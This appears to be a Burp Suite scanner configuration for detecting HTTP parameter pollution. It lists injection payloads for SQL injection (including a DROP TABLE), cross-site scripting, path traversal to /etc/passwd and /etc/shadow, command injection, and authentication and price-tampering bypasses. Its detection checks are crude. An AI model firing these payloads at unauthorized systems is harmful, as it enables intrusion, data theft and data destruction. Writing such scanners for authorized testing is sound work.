# Parameter Pollution Security Bambda
# Detects parameter pollution vulnerabilities

metadata:
  name: "Parameter Pollution Security Bambda"
  description: "Detects parameter pollution vulnerabilities including duplicate parameters, parameter override, and parameter injection"
  author: "Burp Automation Tool"
  version: "1.0.0"
  tags: ["parameter-pollution", "hpp", "http-parameter-pollution", "parameter-override", "parameter-injection"]

rules:
  - name: "Duplicate Parameter Pollution"
    description: "Detects parameter pollution via duplicate parameters"
    severity: "Medium"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "id=1&id=2"
          - payload: "user=admin&user=test"
          - payload: "action=read&action=write"
          - payload: "role=user&role=admin"
          - payload: "type=public&type=private"
        then:
          - if: "response.status == 200"
            issue: "Duplicate Parameter Pollution"
            detail: "Parameter pollution via duplicate parameters detected"
            severity: "Medium"
            confidence: "Medium"

  - name: "Parameter Override"
    description: "Detects parameter override vulnerabilities"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "admin=false&admin=true"
          - payload: "authenticated=no&authenticated=yes"
          - payload: "authorized=false&authorized=true"
          - payload: "privileged=0&privileged=1"
          - payload: "role=user&role=admin"
        then:
          - if: "response.status == 200"
            issue: "Parameter Override"
            detail: "Parameter override vulnerability detected"
            severity: "High"
            confidence: "Medium"

  - name: "Authentication Bypass via Parameter Pollution"
    description: "Detects authentication bypass via parameter pollution"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "auth=0&auth=1"
          - payload: "login=false&login=true"
          - payload: "session=invalid&session=valid"
          - payload: "token=expired&token=active"
          - payload: "user_id=0&user_id=1"
        then:
          - if: "response.status == 200"
            issue: "Authentication Bypass via Parameter Pollution"
            detail: "Authentication bypass via parameter pollution detected"
            severity: "High"
            confidence: "Medium"

  - name: "Authorization Bypass via Parameter Pollution"
    description: "Detects authorization bypass via parameter pollution"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "permission=read&permission=write"
          - payload: "access=denied&access=granted"
          - payload: "level=user&level=admin"
          - payload: "scope=limited&scope=full"
          - payload: "rights=none&rights=all"
        then:
          - if: "response.status == 200"
            issue: "Authorization Bypass via Parameter Pollution"
            detail: "Authorization bypass via parameter pollution detected"
            severity: "High"
            confidence: "Medium"

  - name: "SQL Injection via Parameter Pollution"
    description: "Detects SQL injection via parameter pollution"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "id=1&id=1' OR '1'='1"
          - payload: "user=admin&user=admin'--"
          - payload: "query=test&query=test' UNION SELECT * FROM users--"
          - payload: "search=normal&search=normal' OR 1=1--"
          - payload: "filter=valid&filter=valid' DROP TABLE users--"
        then:
          - if: "response.body contains 'error'"
            issue: "SQL Injection via Parameter Pollution"
            detail: "SQL injection via parameter pollution detected"
            severity: "High"
            confidence: "Medium"

  - name: "XSS via Parameter Pollution"
    description: "Detects XSS via parameter pollution"
    severity: "Medium"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "name=test&name=<script>alert('xss')</script>"
          - payload: "title=normal&title=<img src=x onerror=alert('xss')>"
          - payload: "comment=safe&comment=javascript:alert('xss')"
          - payload: "input=valid&input=<svg onload=alert('xss')>"
          - payload: "text=clean&text='><script>alert('xss')</script>"
        then:
          - if: "response.body contains '<script>'"
            issue: "XSS via Parameter Pollution"
            detail: "XSS via parameter pollution detected"
            severity: "Medium"
            confidence: "Medium"

  - name: "Path Traversal via Parameter Pollution"
    description: "Detects path traversal via parameter pollution"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "file=test.txt&file=../../../etc/passwd"
          - payload: "path=normal&path=../../../../etc/hosts"
          - payload: "dir=valid&dir=../../../../etc/shadow"
          - payload: "location=safe&location=../../../../proc/version"
          - payload: "resource=clean&resource=../../../../proc/cmdline"
        then:
          - if: "response.body contains 'root:'"
            issue: "Path Traversal via Parameter Pollution"
            detail: "Path traversal via parameter pollution detected"
            severity: "High"
            confidence: "Medium"

  - name: "Command Injection via Parameter Pollution"
    description: "Detects command injection via parameter pollution"
    severity: "High"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "cmd=ls&cmd=ls; cat /etc/passwd"
          - payload: "command=test&command=test | whoami"
          - payload: "exec=normal&exec=normal; id"
          - payload: "system=valid&system=valid && pwd"
          - payload: "shell=safe&shell=safe; uname -a"
        then:
          - if: "response.body contains 'root:'"
            issue: "Command Injection via Parameter Pollution"
            detail: "Command injection via parameter pollution detected"
            severity: "High"
            confidence: "Medium"

  - name: "Business Logic Bypass via Parameter Pollution"
    description: "Detects business logic bypass via parameter pollution"
    severity: "Medium"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "price=10&price=0"
          - payload: "quantity=1&quantity=999999"
          - payload: "limit=100&limit=0"
          - payload: "balance=50&balance=999999"
          - payload: "discount=10&discount=100"
        then:
          - if: "response.status == 200"
            issue: "Business Logic Bypass via Parameter Pollution"
            detail: "Business logic bypass via parameter pollution detected"
            severity: "Medium"
            confidence: "Medium"

  - name: "Rate Limiting Bypass via Parameter Pollution"
    description: "Detects rate limiting bypass via parameter pollution"
    severity: "Medium"
    confidence: "Medium"
    
    active:
      - when: "request"
        where: "request.parameters"
        inject:
          - payload: "rate_limit=10&rate_limit=0"
          - payload: "throttle=yes&throttle=no"
          - payload: "limit_reached=true&limit_reached=false"
          - payload: "blocked=yes&blocked=no"
          - payload: "cooldown=active&cooldown=inactive"
        then:
          - if: "response.status == 200"
            issue: "Rate Limiting Bypass via Parameter Pollution"
            detail: "Rate limiting bypass via parameter pollution detected"
            severity: "Medium"
            confidence: "Medium"

filters:
  - name: "API Endpoints"
    when: "request"
    where: "request.url"
    include:
      - pattern: "/api/"
        flags: "i"
      - pattern: "/rest/"
        flags: "i"
      - pattern: "/v[0-9]+/"
        flags: "i"
      - pattern: "/users/"
        flags: "i"
      - pattern: "/admin/"
        flags: "i"

settings:
  max_payloads_per_parameter: 15
  timeout: 10000
  follow_redirects: false
  respect_robots_txt: false
